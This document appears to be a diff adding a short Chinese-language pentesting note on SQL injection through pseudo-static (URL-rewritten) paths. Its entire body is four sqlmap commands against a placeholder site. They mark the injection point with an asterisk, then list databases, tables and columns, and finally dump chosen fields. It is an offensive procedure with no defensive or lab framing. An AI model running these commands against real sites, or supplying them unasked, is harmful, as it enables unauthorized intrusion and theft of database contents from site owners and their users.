@@ -1,0 +1,28 @@
+
+
+               			 SQLMAP渗透笔记之伪静态注入
+
+                                         
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+
+1.在存在注入的地方加上*,然后获取数据库
+
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" --dbs
+
+
+2.获取数据库中的表
+
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -D 数据库名 --tables
+
+
+3.获取数据库中的字段
+
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -D 数据库名 -T 表名 --columns
+
+
+4.获取字段的内容
+
+sqlmap.py -u "http://www.xx.com/index.php/index/view/id/40*.html" -D 数据库名 -T 表名 -C "字段名1,字段名2" --dump
